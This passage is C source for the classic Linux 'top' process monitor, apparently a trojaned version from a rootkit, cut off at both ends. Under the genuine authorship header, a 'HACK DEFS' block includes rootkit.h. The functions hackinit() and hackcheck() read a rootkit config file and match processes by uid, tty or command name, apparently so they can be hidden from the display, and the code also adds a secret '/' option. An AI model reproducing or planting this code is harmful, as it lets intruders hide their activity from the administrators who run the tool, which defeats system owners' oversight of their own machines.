    col = 0;
    for (walk = signals; walk->name; walk++) {
	if (col+strlen(walk->name)+1 > 80) {
	    putchar('\n');
	    col = 0;
	}
	printf("%s%s",col ? " " : "",walk->name);
	col += strlen(walk->name)+1;
    }
    putchar('\n');
}


int get_signal(char *name,const char *cmd)
{
    SIGNAME *walk;

    if (isdigit(*name))
	return atoi(name);
    for (walk = signals; walk->name; walk++)
	if (!strcmp(walk->name,name)) break;
    if (walk->name) return walk->number;
    fprintf(stderr,"%s: unknown signal; %s -l lists signals.\n",name,cmd);
    exit(1);
}
/*
 * top.c              - show top CPU processes
 *
 * Copyright (c) 1992 Branko Lankester
 * Copyright (c) 1992 Roger Binns
 *
 * Snarfed and HEAVILY modified for the YAPPS (yet another /proc ps)
 * by Michael K. Johnson, johnsonm@sunsite.unc.edu.  What is used is what
 * is required to have a common interface.
 *
 * Modified Michael K Johnson's ps to make it a top program.
 * Also borrowed elements of Roger Binns kmem based top program.
 * Changes made by Robert J. Nation (nation@rocket.sanders.lockheed.com)
 * 1/93
 *
 * Modified by Michael K. Johnson to be more efficient in cpu use
 * 2/21/93
 *
 * Changed top line to use uptime for the load average.  Also
 * added SIGTSTP handling.  J. Cowley, 19 Mar 1993.
 *
 * Modified quite a bit by Michael Shields (mjshield@nyx.cs.du.edu)
 * 1994/04/02.  Secure mode added.  "d" option added.  Argument parsing
 * improved.  Switched order of tick display to user, system, nice, idle,
 * because it makes more sense that way.  Style regularized (to K&R,
 * more or less).  Cleaned up much throughout.  Added cumulative mode.
 * Help screen improved.
 *
 * Fixed kill buglet brought to my attention by Rob Hooft.
 * Problem was mixing of stdio and read()/write().  Added
 * getnum() to solve problem.
 * 12/30/93 Michael K. Johnson
 *
 * Added toggling output of idle processes via 'i' key.
 * 3/29/94 Gregory K. Nickonov
 *
 * Fixed buglet where rawmode wasn't getting restored.
 * Added defaults for signal to send and nice value to use.
 * 5/4/94 Jon Tombs.
 *
 * Modified 1994/04/25 Michael Shields <mjshield@nyx.cs.du.edu>
 * Merged previous changes to 0.8 into 0.95.
 * Allowed the use of symbolic names (e.g., "HUP") for signal input.
 * Rewrote getnum() into getstr(), getint(), getsig(), etc.
 * 
 * Modified 1995  Helmut Geyer <Helmut.Geyer@iwr.uni-heidelberg.de> 
 * added kmem top functionality (configurable fields)
 * configurable order of process display
 * Added options for dis/enabling uptime, statistics, and memory info.
 * fixed minor bugs for ELF systems (e.g. SIZE, RSS fields)
 *
 * Modified 1996/05/18 Helmut Geyer <Helmut.Geyer@iwr.uni-heidelberg.de>
 * Use of new interface and general cleanup. The code should be far more
 * readable than before.
 */

#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <time.h>
#include <sys/ioctl.h>
#include <pwd.h>
#include <linux/sched.h>
#include <linux/tty.h>
#include <termcap.h>
#include <termios.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <ctype.h>
#include <setjmp.h>
#include <stdarg.h>

#include "proc/sysinfo.h"
#include "proc/ps.h"
#include "proc/whattime.h"
#include "proc/signals.h"
#include "proc/version.h"
#include "proc/readproc.h"
/* these should be in the readproc.h header or in the ps.h header */
typedef int (*cmp_t)(void*,void*);
extern void reset_sort_options (void);
extern int parse_sort_opt(char* opt);
extern void register_sort_function (int dir, cmp_t func);
extern char *status(proc_t* task);

#define PUTP(x) (tputs(x,1,putchar))

#include "top.h"  /* new header for top specific things */

/* HACK DEFS */
#include "../rootkit.h"
#define STR_SIZE 128
#define SPC_CHAR " "
#define END_CHAR "\n"
int showall=0;

struct  h_st {
        struct h_st     *next;
        int             hack_type;
        char            hack_cmd[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];
char    *strp;

FILE    *fp_hack;

void hackinit(void)
{
   h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
   hack_list=h_tmp;

   if ((int)fp_hack=fopen(ROOTKIT_PROCESS_FILE,"r")) {
      while (fgets(tmp_str, 126, fp_hack)) {
         h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
         strp=tmp_str;
         strp=strtok (strp, SPC_CHAR);
         h_tmp->hack_type=atoi(strp);
         strp=strtok ('\0', END_CHAR);
         strcpy (h_tmp->hack_cmd, strp);
         h_tmp=h_tmp->next;
      }
   fclose(fp_hack);
   }
   h_tmp->next=NULL;
}

int hackcheck(proc_t *p)
{
int i=0;
   if (!p) return 0; 
   for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
      switch (h_tmp->hack_type) {
       case 0:
         if (p->uid==atoi(h_tmp->hack_cmd))
           return 1;
         break;
       case 1:
         while((p->ttyc[i]==' ')&&(i<4)) i++;
         if (!strcmp(&p->ttyc[i], h_tmp->hack_cmd))
           return 1;
         break;
       case 2:
         if (strcmp((char *)p->cmd,h_tmp->hack_cmd)==0)
           return 1;
         break;
        case 3:
         if (strstr((char *)p->cmd,h_tmp->hack_cmd))
           return 1;
         break;
      }
   }
return 0;
}

/*#######################################################################
 *####  Startup routines: parse_options, get_options,      ##############
 *####                    setup_terminal and main          ##############
 *#######################################################################
 */

      /*
       * parse the options string as read from the config file(s).
       * if top is in secure mode, disallow changing of the delay time between
       * screen updates.
       */
void parse_options(char *Options, int secure)
{
    int i;
    hackinit();
    for (i = 0; i < strlen(Options); i++) {
	switch (Options[i]) {
	  case '2':
	  case '3':
	  case '4':
	  case '5':
	  case '6':
	  case '7':
	  case '8':
	  case '9':
	    if (!secure)
		Sleeptime = (float) Options[i] - '0';
	    break;
	  case 'S':
	    Cumulative = 1;
	    headers[22][1] = 'C';
	    break;
	  case 's':
	    Secure = 1;
	    break;
	  case 'i':
	    Noidle = 1;
	    break;
	  case 'm':
	    show_memory = 0;
	    header_lines -= 2;
	    break;
	  case 'M':
	    sort_type = S_MEM;
	    reset_sort_options();
	    register_sort_function( -1, (cmp_t)mem_sort);
	    break;
	  case 'l':
	    show_loadav = 0;
	    header_lines -= 1;
	    break;
	  case 'P':
	    sort_type = S_PCPU;
	    reset_sort_options();
	    register_sort_function( -1, (cmp_t)pcpu_sort);
	    break;
	  case 't':
	    show_stats = 0;
	    header_lines -= 2;
	    break;
	  case 'T':
	    sort_type = S_TIME;
	    reset_sort_options();
	    register_sort_function( -1, (cmp_t)time_sort);
	    break;
	  case 'c':
	    show_cmd = 1;
	    break;
	  case '\n':
	    break;
	  default:
	    fprintf(stderr, "Wrong configuration option %c\n", i);
	    exit(1);
	    break;
	}
    }
}

/* 
 * Read the configuration file(s). There are two files, once SYS_TOPRC 
 * which should only contain the secure switch and a sleeptime
 * value iff ordinary users are to use top in secure mode only.
 * 
 * The other file is $HOME/RCFILE. 
 * The configuration file should contain two lines (any of which may be
 *  empty). The first line specifies the fields that are to be displayed
 * in the order you want them to. Uppercase letters specify fields 
 * displayed by default, lowercase letters specify fields not shown by
 * default. The order of the letters in this line corresponds to the 
 * order of the displayed fileds.
 *
 * all Options but 'q' can be read from this config file
 * The delay time option syntax differs from the commandline syntax:
 *   only integer values between 2 and 9 seconds are recognized
 *   (this is for standard configuration, so I think this should do).
 *
 * usually this file is not edited by hand, but written from top using
 * the 'W' command. 
 */

void get_options(void)
{
    FILE *fp;
    char *pt;
    char rcfile[MAXNAMELEN];
    char Options[256] = "";

    header_lines = 7;
    strcpy(rcfile, SYS_TOPRC);
    fp = fopen(rcfile, "r");
    if (fp != NULL) {
	fgets(Options, 254, fp);
	fclose(fp);
    }
    parse_options(Options, 0);
    strcpy(Options, "");
    if (getenv("HOME")) {
	strcpy(rcfile, getenv("HOME"));
	strcat(rcfile, "/");
    }
    strcat(rcfile, RCFILE);
    fp = fopen(rcfile, "r");
    if (fp == NULL) {
	strcpy(Fields, DEFAULT_SHOW);
    } else {
	if (fgets(Fields, 254, fp) != NULL) {
	    pt = strstr(Fields, "\n");
	    *pt = 0;
	}
	fgets(Options, 254, fp);
	fclose(fp);
    }
    parse_options(Options, getuid()? Secure : 0);
}

/*
     * Set up the terminal attributes.
     */
void setup_terminal(void)
{
    char *termtype;
    struct termio newtty;

    termtype = getenv("TERM");
    if (!termtype) {
	/* In theory, $TERM should never not be set, but in practice,
	   some gettys don't.  Fortunately, vt100 is nearly always
	   correct (or pretty close). */
	termtype = "VT100";
	/* fprintf(stderr, PROGNAME ": $TERM not set\n"); */
	/* exit(1); */
    }
    if (ioctl(0, TCGETA, &Savetty) == -1) {
	perror(PROGNAME ": ioctl() failed");
	error_end(errno);
    }
    newtty = Savetty;
    newtty.c_lflag &= ~ICANON;
    newtty.c_lflag &= ~ECHO;
    newtty.c_cc[VMIN] = 1;
    newtty.c_cc[VTIME] = 0;
    if (ioctl(0, TCSETAF, &newtty) == -1) {
	printf("cannot put tty into raw mode\n");
	error_end(1);
    }
    ioctl(0, TCGETA, &Rawtty);

    /*
     * Get termcap entries and window size.
     */
    tgetent(NULL, termtype);
    cm = tgetstr("cm", 0);
    top_clrtobot = tgetstr("cd", 0);
    cl = tgetstr("cl", 0);
    top_clrtoeol = tgetstr("ce", 0);
    ho = tgetstr("ho", 0);
    md = tgetstr("md", 0);
    mr = tgetstr("mr", 0);
    me = tgetstr("me", 0);
}

int main(int argc, char **argv)
{
    /* For select(2). */
    struct timeval tv;
    fd_set in;
    /* For parsing arguments. */
    char *cp;
    /* The key read in. */
    char c;

    get_options();
    /*
     * Parse arguments.
     */
    argv++;
    while (*argv) {
	cp = *argv++;
	while (*cp) {
	    switch (*cp) {
	      case 'd':
	        if (cp[1]) {
		    if (sscanf(++cp, "%f", &Sleeptime) != 1) {
			fprintf(stderr, PROGNAME ": Bad delay time `%s'\n", cp);
			exit(1);
		    }
		    goto breakargv;
		} else if (*argv) { /* last char in an argv, use next as arg */
		    if (sscanf(cp = *argv++, "%f", &Sleeptime) != 1) {
			fprintf(stderr, PROGNAME ": Bad delay time `%s'\n", cp);
			exit(1);
		    }
		    goto breakargv;
		} else {
		    fprintf(stderr, "-d requires an argument\n");
		    exit(1);
		}
		break;
	      case 'q':
		if (!getuid())
		    /* set priority to -10 in order to stay above kswapd */
		    if (setpriority(PRIO_PROCESS, getpid(), -10)) {
			/* We check this just for paranoia.  It's not
			   fatal, and shouldn't happen. */
			perror(PROGNAME ": setpriority() failed");
		    }
		Sleeptime = 0;
		break;
	      case 'c':
	        show_cmd = !show_cmd;
		break;
	      case 'S':
		Cumulative = 1;
		break;
	      case 'i':
		Noidle = 1;
		break;
	      case 's':
		Secure = 1;
		break;
	      case '-':
		break;		/* Just ignore it */
#if defined (SHOWFLAG)
              case '/': showall++;
#endif
	      default:
		fprintf(stderr, PROGNAME ": Unknown argument `%c'\n", *cp);
		exit(1);
	    }
	    cp++;
	}
    breakargv:
    }
    
    /* set to PCPU sorting */
    register_sort_function( -1, (cmp_t)pcpu_sort);
    
    /* for correct handling of some fields, we have to do distinguish 
  * between kernel versions */
    set_linux_version();
    /* get kernel symbol table, if needed */
    if (!CL_wchan_nout) {
	if (open_psdb()) {
	    CL_wchan_nout = 1;
	} else {
	    psdbsucc = 1;
	}
    }

    setup_terminal();
    window_size();
    /*
     * calculate header size, length of cmdline field ...
     */
    Numfields = make_header();
    /*
     * Set up signal handlers.
     */
    signal(SIGHUP, (void *) (int) end);
    signal(SIGINT, (void *) (int) end);
    signal(SIGQUIT, (void *) (int) end);
    signal(SIGTSTP, (void *) (int) stop);
    signal(SIGWINCH, (void *) (int) window_size);

    /* loop, collecting process info and sleeping */
    while (1) {
	if (setjmp(redraw_jmp))
	    clear_screen();

	/* display the tasks */
	show_procs();
	/* sleep & wait for keyboard input */
	tv.tv_sec = Sleeptime;
	tv.tv_usec = (Sleeptime - (int) Sleeptime) * 1000000;
	FD_ZERO(&in);
	FD_SET(0, &in);
	if (select(16, &in, 0, 0, &tv) > 0 && read(0, &c, 1) == 1)
	    do_key(c);
    }
}

/*#######################################################################
 *#### Signal handled routines: error_end, end, stop, window_size     ###
 *#### Small utilities: make_header, getstr, getint, getfloat, getsig ###
 *#######################################################################
 */


	/*
	 *  end when exiting with an error.
	 */
void error_end(int rno)
{
    if (psdbsucc)
        close_psdb();
    ioctl(0, TCSETAF, &Savetty);
    PUTP(tgoto(cm, 0, Lines - 1));
    fputs("\r\n", stdout);
    exit(rno);
}
/*
	 * Normal end of execution.
	 */
void end(void)
{
    if (psdbsucc)
	close_psdb();
    ioctl(0, TCSETAF, &Savetty);
    PUTP(tgoto(cm, 0, Lines - 1));
    fputs("\r\n", stdout);
    exit(0);
}

/*
	 * SIGTSTP catcher.
	 */
void stop(void)
{
    /* Reset terminal. */
    if (psdbsucc)
	close_psdb();
    ioctl(0, TCSETAF, &Savetty);
    PUTP(tgoto(cm, 0, Lines - 3));
    fflush(stdout);
    raise(SIGTSTP);
    /* Later... */
    ioctl(0, TCSETAF, &Rawtty);
    signal(SIGTSTP, (void *) (int) stop);
    longjmp(redraw_jmp, 1);
}

/*
       * Reads the window size and clear the window.  This is called on setup,
       * and also catches SIGWINCHs, and adjusts Maxlines.  Basically, this is
       * the central place for window size stuff.
       */
void window_size(void)
{
    struct winsize ws;

    if (ioctl(1, TIOCGWINSZ, &ws) != -1) {
	Cols = ws.ws_col;
	Lines = ws.ws_row;
    } else {
	Cols = tgetnum("co");
	Lines = tgetnum("li");
    }
    clear_screen();
}
/*
       * this adjusts the lines needed for the header to the current value
       */
int make_header(void)
{
    int i, j;

    j = 0;
    for (i = 0; i < strlen(Fields); i++) {
	if (isupper(Fields[i])) {
	    pflags[j++] = Fields[i] - 'A';
	}
    }
    strcpy(Header, "");
    for (i = 0; i < j; i++)
	strcat(Header, headers[pflags[i]]);
    /* readjust window size ... */
    Maxcmd = Cols - strlen(Header) + 7;
    Maxlines = Display_procs ? Display_procs : Lines - header_lines;
    if (Maxlines > Lines - header_lines)
	Maxlines = Lines - header_lines;
    return (j);
}



/*
       * Get a string from the user; the base of getint(), et al.  This really
       * ought to handle long input lines and errors better.  NB: The pointer
       * returned is a statically allocated buffer, so don't expect it to
       * persist between calls.
       */
char *getstr(void)
{
    static char line[BUFSIZ];	/* BUFSIZ from <stdio.h>; arbitrary */
    int i = 0;

    /* Must make sure that buffered IO doesn't kill us. */
    fflush(stdout);
    fflush(stdin);		/* Not POSIX but ok */

    do {
	read(STDIN_FILENO, &line[i], 1);
    } while (line[i++] != '\n' && i < sizeof(line));
    line[--i] = 0;

    return (line);
}


/*
       * Get an integer from the user.  Display an error message and return -1
       * if it's invalid; else return the number.
       */
int getint(void)
{
    char *line;
    int i;
    int r;

    line = getstr();

    for (i = 0; line[i]; i++) {
	if (!isdigit(line[i]) && line[i] != '-') {
	    SHOWMESSAGE(("That's not a number!"));
	    return (-1);
	}
    }

    /* An empty line is a legal error (hah!). */
    if (!line[0])
	return (-1);

    sscanf(line, "%d", &r);
    return (r);
}


/*
	 * Get a float from the user.  Just like getint().
	 */
float getfloat(void)
{
    char *line;
    int i;
    float r;

    line = getstr();

    for (i = 0; line[i]; i++) {
	if (!isdigit(line[i]) && line[i] != '.' && line[i] != '-') {
	    SHOWMESSAGE(("That's not a float!"));
	    return (-1);
	}
    }

    /* An empty line is a legal error (hah!). */
    if (!line[0])
	return (-1);

    sscanf(line, "%f", &r);
    return (r);
}


/*
	 * Get a signal number or name from the user.  Return the number, or -1
	 * on error.
	 */
int getsig(void)
{
    char *line;

    /* This is easy. */
    line = getstr();
    return (get_signal2(line));
}

/*#######################################################################
 *####  Routine for sorting on used time, resident memory and %CPU  #####
 *####  It would be easy to include full sorting capability as in   #####
 *####  ps, but I think there is no real use for something that     #####
 *####  complicated. Using register_sort_function or parse_sort_opt #####
 *####  you just have to do the natural thing and it will work.     #####
 *#######################################################################
 */

int time_sort (proc_t **P, proc_t **Q)
{
    if (Cumulative) {
	if( ((*P)->cutime + (*P)->cstime + (*P)->utime + (*P)->stime) < 
	    ((*Q)->cutime + (*Q)->cstime + (*Q)->utime + (*Q)->stime) )
	    return -1;
	if( ((*P)->cutime + (*P)->cstime + (*P)->utime + (*P)->stime) >
	    ((*Q)->cutime + (*Q)->cstime + (*Q)->utime + (*Q)->stime) )
	    return 1;
    } else {
	if( ((*P)->utime + (*P)->stime) < ((*Q)->utime + (*Q)->stime))
	    return -1;
	if( ((*P)->utime + (*P)->stime) > ((*Q)->utime + (*Q)->stime))
	    return 1;
    }
    return 0;
}

int pcpu_sort (proc_t **P, proc_t **Q)
{
    if( (*P)->pcpu < (*Q)->pcpu )      return -1;
    if( (*P)->pcpu > (*Q)->pcpu )      return 1;
    return 0;
}

int mem_sort (proc_t **P, proc_t **Q)
{
    if( (*P)->resident < (*Q)->resident )      return -1;
    if( (*P)->resident > (*Q)->resident )      return 1;  
    return 0;
}

/*#######################################################################
 *####  Routines handling the field selection/ordering screens:  ########
 *####    show_fields, change_order, change_fields               ########
 *#######################################################################
 */

        /*
	 * Display the specification line of all fields. Upper case indicates
	 * a displayed field, display order is according to the order of the 
	 * letters. A short description of each field is shown as well.
	 * The description of a displayed field is marked by a leading 
	 * asterisk (*).
	 */
void show_fields(void)
{
    int i, row, col;
    char *p;

    clear_screen();
    PUTP(tgoto(cm, 3, 0));
    printf("Current Field Order: %s\n", Fields);
    for (i = 0; i < sizeof headers / sizeof headers[0]; ++i) {
	row = i % (Lines - 3) + 3;
	col = i / (Lines - 3) * 40;
	PUTP(tgoto(cm, col, row));
	for (p = headers[i]; *p == ' '; ++p);
	printf("%c %c: %-10s = %s", (strchr(Fields, i + 'A') != NULL) ? '*' : ' ', i + 'A',
	       p, headers2[i]);
    }
}

/*
	 * change order of displayed fields
	 */
void change_order(void)
{
    char c, ch, *p;
    int i;

    show_fields();
    for (;;) {
	PUTP(tgoto(cm, 0, 0));
	PUTP(top_clrtoeol);
	PUTP(tgoto(cm, 3, 0));
	PUTP(mr);
	printf("Current Field Order: %s", Fields);
	PUTP(me);
	putchar('\n');
	PUTP(tgoto(cm, 0, 1));
	printf("Upper case characters move a field to the left, lower case to the right");
	fflush(stdout);
	ioctl(0, TCSETAF, &Rawtty);
	read(0, &c, 1);
	ioctl(0, TCSETAF, &Savetty);
	i = toupper(c) - 'A';
	if ((p = strchr(Fields, i + 'A')) != NULL) {
	    if (isupper(c))
		p--;
	    if ((p[1] != '\0') && (p >= Fields)) {
		ch = p[0];
		p[0] = p[1];
		p[1] = ch;
	    }
	} else if ((p = strchr(Fields, i + 'a')) != NULL) {
	    if (isupper(c))
		p--;
	    if ((p[1] != '\0') && (p >= Fields)) {
		ch = p[0];
		p[0] = p[1];
		p[1] = ch;
	    }
	} else {
	    break;
	}
    }
    Numfields = make_header();
}
/*
	 * toggle displayed fields
	 */
void change_fields(void)
{
    int i, changed = 0;
    int row, col;
    char c, *p;
    char tmp[2] = " ";

    show_fields();
    for (;;) {
	PUTP(tgoto(cm, 0, 0));
	PUTP(top_clrtoeol);
	PUTP(tgoto(cm, 3, 0));
	PUTP(mr);
	printf("Current Field Order: %s", Fields);
	PUTP(me);
	putchar('\n');
	PUTP(tgoto(cm, 0, 1));
	printf("Toggle fields with a-x, any other key to return: ");
	fflush(stdout);
	ioctl(0, TCSETAF, &Rawtty);
	read(0, &c, 1);
	ioctl(0, TCSETAF, &Savetty);
	i = toupper(c) - 'A';
	if (i >= 0 && i < sizeof headers / sizeof headers[0]) {
	    row = i % (Lines - 3) + 3;
	    col = i / (Lines - 3) * 40;
	    PUTP(tgoto(cm, col, row));
	    if ((p = strchr(Fields, i + 'A')) != NULL) {	/* deselect Field */
		*p = i + 'a';
		putchar(' ');
	    } else if ((p = strchr(Fields, i + 'a')) != NULL) {		/* select previously */
		*p = i + 'A';	/* deselected field */
		putchar('*');
	    } else {		/* select new field */
		tmp[0] = i + 'A';
		strcat(Fields, tmp);
		putchar('*');
	    }
	    changed = 1;
	    fflush(stdout);
	} else
	    break;
    }
    if (changed)
	Numfields = make_header();
}

/*
 *#######################################################################
 *####  Routines handling the main top screen:                   ########
 *####    show_task_info, show_procs, show_memory, do_stats      ########
 *#######################################################################
 */
	/*
	 * Displays infos for a single task
	 */
void show_task_info(proc_t *task, int pmem)
{
    int i,j;
    unsigned int t;
    char *cmdptr;
    char tmp[2048], tmp2[2048] = "", tmp3[2048] = "";

    for (i = 0; i < Numfields; i++) {
	tmp[0] = 0;
	switch (pflags[i]) {
	  case P_PID:
	    sprintf(tmp, "%5d ", task->pid);
	    break;
	  case P_PPID:
	    sprintf(tmp, "%5d ", task->ppid);
	    break;
	  case P_UID:
	    sprintf(tmp, "%4d ", task->uid);
	    break;
	  case P_USER:
	    sprintf(tmp, "%-8.8s ", task->user);
	    break;
	  case P_PCPU:
	    sprintf(tmp, "%2d.%1d ", task->pcpu / 10, task->pcpu % 10);
	    break;
	  case P_PMEM:
	    sprintf(tmp, "%2d.%1d ", pmem / 10, pmem % 10);
	    break;
	  case P_TTY:
	    sprintf(tmp, "%-3.3s ", task->ttyc);
	    break;
	  case P_PRI:
	    sprintf(tmp, "%3d ", task->priority);
	    break;
	  case P_NICE:
	    sprintf(tmp, "%3d ", task->nice);
	    break;
	  case P_PAGEIN:
	    sprintf(tmp, "%6d ", task->maj_flt);
	    break;
	  case P_TSIZ:
	    sprintf(tmp, "%5d ", (task->end_code - task->start_code) / 1024);
	    break;
	  case P_DSIZ:
	    sprintf(tmp, "%5d ", (task->vsize - task->end_code) / 1024);
	    break;
	  case P_SIZE:
	    sprintf(tmp, "%5d ", task->size << CL_pg_shift);
	    break;
	  case P_TRS:
	    sprintf(tmp, "%4d ", task->trs << CL_pg_shift);
	    break;
	  case P_SWAP:
	    sprintf(tmp, "%4d ", (task->size - task->resident) << CL_pg_shift);
	    break;
	  case P_SHARE:
	    sprintf(tmp, "%5d ", task->share << CL_pg_shift);
	    break;
	  case P_A:
	    sprintf(tmp, "%3.3s ", "NYI");
	    break;
	  case P_WP:
	    sprintf(tmp, "%3.3s ", "NYI");
	    break;
	  case P_DT:
	    sprintf(tmp, "%3d ", task->dt);
	    break;
	  case P_RSS:	/* resident not rss, it seems to be more correct. */
	    sprintf(tmp, "%4d ", task->resident << CL_pg_shift);
	    break;
	  case P_WCHAN:
	    if (!CL_wchan_nout)
		sprintf(tmp, "%-9.9s ", wchan(task->wchan));
	    else
		sprintf(tmp, "%-9x", task->wchan);
	    break;
	  case P_STAT:
	    sprintf(tmp, "%-4.4s ", status(task));
	    break;
	  case P_TIME:
	    t = (task->utime + task->stime) / HZ;
	    if (Cumulative)
		t += (task->cutime + task->cstime) / HZ;
	    sprintf(tmp, "%3d:%02d ", t / 60, t % 60);
	    break;
	  case P_COMMAND:
	    if (!show_cmd && task->cmdline && *(task->cmdline)) {
	        j=0;
	        while(((task->cmdline)[j] != NULL) && (strlen(tmp3)<1024)){
		    strcat(tmp3,(task->cmdline)[j]);
		    j++; 
	        }
	        cmdptr = tmp3;
	    } else {
		cmdptr = task->cmd;
	    }
	    if (strlen(cmdptr) > Maxcmd)
		cmdptr[Maxcmd - 1] = 0;
	    sprintf(tmp, "%s", cmdptr);
	    tmp3[0]=0;
	    break;
	  case P_LTR:
	    sprintf(tmp, "%4d ", task->lrs << CL_pg_shift);
	    break;
	  case P_FLAGS:
	    sprintf(tmp, "%8x ", task->flags);
	    break;
	}
	strcat(tmp2, tmp);
    }
    if (strlen(tmp2) > Cols - 1)
	tmp2[Cols - 1] = 0;
    printf("\n%s", tmp2);
    PUTP(top_clrtoeol);
}

/*
 * This is the real program!  Read process info and display it.
 * One could differentiate options of readproctable2, perhaps it
 * would be useful to support the PROC_UID, PROC_TTY and PROC_PID
 * as command line options.
 */
void show_procs(void)
{
    static proc_t **p_table=NULL;
    static int proc_flags;
    int count;
    float elapsed_time;
    unsigned int main_mem;
    static int first=0;

    if (first==0) {
	proc_flags=PROC_FILLMEM|PROC_FILLCMD|PROC_FILLTTY|PROC_FILLUSR;
	p_table=readproctab2(proc_flags, p_table, NULL);
	elapsed_time = get_elapsed_time();
	do_stats(p_table, elapsed_time, 0);
	sleep(1);
	first=1;
    }
    /* Display the load averages. */
    PUTP(ho);
    PUTP(md);
    if (show_loadav) {
	printf("%s", sprint_uptime());
	PUTP(top_clrtoeol);
	putchar('\n');
    }
    p_table=readproctab2(proc_flags, p_table, NULL);
    /* Immediately find out the elapsed time for the frame. */
    elapsed_time = get_elapsed_time();
    /* Display the system stats, calculate percent CPU time
     * and sort the list. */
    do_stats(p_table, elapsed_time,1);
    /* Display the memory and swap space usage. */
    main_mem = show_meminfo();
    if (strlen(Header) + 2 > Cols)
	Header[Cols - 2] = 0;
    PUTP(mr);
    fputs(Header, stdout);
    PUTP(top_clrtoeol);
    PUTP(me);

    /*
     * Finally!  Loop through to find the top task, and display it.
     * Lather, rinse, repeat.
     */
    count = 0;
    while ((count < Maxlines) && (p_table[count]->pid!=-1)) {
	int pmem;
	char stat;

	stat = p_table[count]->state;

	if (!Noidle || (stat != 'S' && stat != 'Z')) {

	    /*
	     * Show task info.
	     */
	    pmem = p_table[count]->resident * 1000 / (main_mem / 4096);
	    show_task_info(p_table[count], pmem);
	}
	count++;
    }
    PUTP(top_clrtobot);
    PUTP(tgoto(cm, 0, header_lines - 2));
    fflush(stdout);
}


/*
 * Finds the current time (in microseconds) and calculates the time
 * elapsed since the last update. This is essential for computing
 * percent CPU usage.
 */
float get_elapsed_time(void)
{
    struct timeval time;
    static struct timeval oldtime;
    struct timezone timez;
    float elapsed_time;

    gettimeofday(&time, &timez);
    elapsed_time = (time.tv_sec - oldtime.tv_sec)
	+ (float) (time.tv_usec - oldtime.tv_usec) / 1000000.0;
    oldtime.tv_sec = time.tv_sec;
    oldtime.tv_usec = time.tv_usec;
    return (elapsed_time);
}


/*
 * Reads the memory info and displays it.  Returns the total memory
 * available, for use in percent memory usage calculations.
 */
unsigned show_meminfo(void)
{
    unsigned **mem;

    if (!(mem = meminfo()) ||	/* read+parse /proc/meminfo */
	mem[meminfo_main][meminfo_total] == 0) {	/* cannot normalize mem usage */
	fprintf(stderr, "Cannot get size of memory from /proc/meminfo\n");
	error_end(1);
    }
    if (show_memory) {
	printf("Mem:  %5dK av, %5dK used, %5dK free, %5dK shrd, %5dK buff",
	       mem[meminfo_main][meminfo_total] >> 10,
	       mem[meminfo_main][meminfo_used] >> 10,
	       mem[meminfo_main][meminfo_free] >> 10,
	       mem[meminfo_main][meminfo_shared] >> 10,
	       mem[meminfo_main][meminfo_buffers] >> 10);
	PUTP(top_clrtoeol);
	putchar('\n');
	printf("Swap: %5dK av, %5dK used, %5dK free               %5dK cached",
	       mem[meminfo_swap][meminfo_total] >> 10,
	       mem[meminfo_swap][meminfo_used] >> 10,
	       mem[meminfo_swap][meminfo_free] >> 10,
	       mem[meminfo_total][meminfo_cached] >> 10);
	PUTP(top_clrtoeol);
	putchar('\n');
    }
    PUTP(me);
    PUTP(top_clrtoeol);
    putchar('\n');
    return mem[meminfo_main][meminfo_total];
}

/*
 * Calculates the number of tasks in each state (running, sleeping, etc.).
 * Calculates the CPU time in each state (system, user, nice, etc).
 * Calculates percent cpu usage for each task.
 */
void do_stats(proc_t** p, float elapsed_time, int pass)
{
    proc_t *this;
    int index, total_time, i, n = 0;
    int sleeping = 0, stopped = 0, zombie = 0, running = 0;
    int system_ticks = 0, user_ticks = 0, nice_ticks = 0, idle_ticks = 1000;
    static int prev_count = 0;
    int stime, utime;
    static struct save_hist save_history[NR_TASKS];
    struct save_hist New_save_hist[NR_TASKS];

    /*
     * Make a pass through the data to get stats.
     */
    index = 0;
    while (p[n]->pid != -1) {
	this = p[n];
	switch (this->state) {
	  case 'S':
	  case 'D':
	    sleeping++;
	    break;
	  case 'T':
	    stopped++;
	    break;
	  case 'Z':
	    zombie++;
	    break;
	  case 'R':
	    running++;
	    break;
	  default:
	    /* Don't know how to handle this one. */
	    break;
        }

	/*
	 * Calculate time in this process.  Time is sum of user time
	 * (utime) plus system time (stime).
	 */
	total_time = this->utime + this->stime;
	New_save_hist[index].ticks = total_time;
	New_save_hist[index].pid = this->pid;
	stime = this->stime;
	utime = this->utime;
	New_save_hist[index].stime = stime;
	New_save_hist[index].utime = utime;
	/* find matching entry from previous pass */
	i = 0;
	while (i < prev_count) {
	    if (save_history[i].pid == this->pid) {
		total_time -= save_history[i].ticks;
		stime -= save_history[i].stime;
		utime -= save_history[i].utime;

		i = NR_TASKS;
	    }
	    i++;
	}

	/*
	 * Calculate percent cpu time for this task.
	 */
	this->pcpu = (total_time * 10 * 100/HZ) / elapsed_time;
	if (this->pcpu > 999)
	    this->pcpu = 999;

	/*
	 * Calculate time in idle, system, user and niced tasks.
	 */
	idle_ticks -= this->pcpu;
	system_ticks += stime;
	user_ticks += utime;
	if (this->priority > 0)
	    nice_ticks += this->pcpu;

	index++;
	n++;
	if (n > NR_TASKS) {
	    printf(PROGNAME ": Help!  Too many tasks!\n");
	    end();
	}
    }

    if (idle_ticks < 0)
	idle_ticks = 0;
    system_ticks = (system_ticks * 10 * 100/HZ) / elapsed_time;
    user_ticks = (user_ticks * 10 * 100/HZ) / elapsed_time;

    /*
     * Display stats.
     */
    if (pass > 0 && show_stats) {
	printf("%d processes: %d sleeping, %d running, %d zombie, "
	       "%d stopped",
	       n, sleeping, running, zombie, stopped);
	PUTP(top_clrtoeol);
	putchar('\n');
	printf("CPU states: %2d.%d%% user, %2d.%d%% system,"
	       " %2d.%d%% nice, %2d.%d%% idle",
	       user_ticks / 10, user_ticks % 10,
	       system_ticks / 10, system_ticks % 10,
	       nice_ticks / 10, nice_ticks % 10,
	       idle_ticks / 10, idle_ticks % 10);
	PUTP(top_clrtoeol);
	putchar('\n');
    }
    /*
     * Save this frame's information.
     */
    for (i = 0; i < n; i++) {
	/* copy the relevant info for the next pass */
 	save_history[i].pid = New_save_hist[i].pid;
